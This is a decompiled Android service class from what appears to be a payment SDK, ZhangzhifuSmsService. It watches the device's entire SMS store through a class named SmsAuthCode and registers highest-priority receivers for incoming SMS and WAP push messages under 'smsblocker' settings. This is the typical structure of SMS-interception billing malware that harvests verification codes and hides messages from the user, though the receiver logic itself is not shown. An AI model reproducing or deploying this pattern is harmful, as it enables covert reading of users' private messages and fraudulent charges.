package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.text.format.Time;
import com.zhangzhifu.sdk.util.sms.SmsReceiver;
import com.zhangzhifu.sdk.util.sms.WapPushReceiver;
import com.zhangzhifu.sdk.util.sms.util.SmsAuthCode;

public class ZhangzhifuSmsService
  extends Service
{
  private SmsReceiver bo = null;
  private WapPushReceiver bp = null;
  private SmsAuthCode bq = null;
  
  public ZhangzhifuSmsService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    this.bq = new SmsAuthCode(this, new Handler());
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.bq);
    super.onCreate();
  }
  
  public void onDestroy()
  {
    try
    {
      getContentResolver().unregisterContentObserver(this.bq);
      unregisterReceiver(this.bo);
      unregisterReceiver(this.bp);
      stopForeground(false);
      super.onDestroy();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    paramIntent = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablesmsblocker", true)))
    {
      this.bo = new SmsReceiver();
      IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      localIntentFilter.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.bo, localIntentFilter);
    }
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablewappushblocker", true)))
    {
      this.bp = new WapPushReceiver();
      paramIntent = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
      paramIntent.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.bp, paramIntent);
    }
    new Time().setToNow();
    return 1;
  }
}
